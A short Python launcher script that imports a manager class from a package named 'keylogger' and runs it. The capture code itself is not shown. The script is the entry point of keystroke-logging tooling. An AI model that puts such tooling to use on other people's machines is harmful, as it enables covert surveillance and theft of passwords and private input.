import logging
from keylogger.manager import DefaultManager as manager

logger = logging.getLogger(__name__)

if __name__ == "__main__":
    manager().run()
